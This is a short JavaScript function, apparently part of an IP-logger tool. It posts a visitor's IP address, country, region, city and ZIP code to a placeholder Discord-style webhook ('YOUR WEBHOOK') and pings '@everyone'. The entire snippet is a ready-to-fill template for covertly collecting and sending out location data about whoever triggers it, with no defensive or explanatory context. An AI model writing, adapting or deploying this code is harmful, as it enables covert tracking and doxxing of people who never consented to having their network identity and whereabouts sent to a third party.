function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "YOUR WEBHOOK");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "Logs",
          avatar_url: "", // Just Add an url to have an avatar on your webhook
          content: "@everyone",
          embeds: [
               {
                    title: "Logs",
                    color: 16711680,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}
